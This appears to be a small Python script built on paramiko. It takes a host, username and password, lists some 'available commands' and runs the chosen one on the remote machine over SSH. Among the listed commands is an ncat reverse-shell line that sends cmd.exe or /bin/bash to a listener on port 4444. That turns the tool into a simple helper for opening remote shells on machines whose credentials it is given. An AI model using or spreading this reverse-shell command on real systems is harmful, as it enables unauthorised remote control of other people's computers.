import paramiko
import socket

hostname = input("Enter the Host IP you want to connect to: ")
username = input("Enter the Username: ")
password = input("Enter the Password: ")
print("Here are available commands:")
commands = [
    "dir",
    "ps",
    "ncat [ServerIP] 4444 -e cmd.exe / /bin/bash"
]
for i in commands:
    print(i)
command = input("Enter the command to execute ")


# initialize the SSH client
client = paramiko.SSHClient()
# add to known hosts
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
    client.connect(hostname=hostname, username=username, password=password)
except:
    print("[!] Cannot connect to the SSH Server")
    exit()

print("="*50, command, "="*50)
stdin, stdout, stderr = client.exec_command(command)
print(stdout.read().decode())
err = stderr.read().decode()
if err:
    print(err)
    

client.close()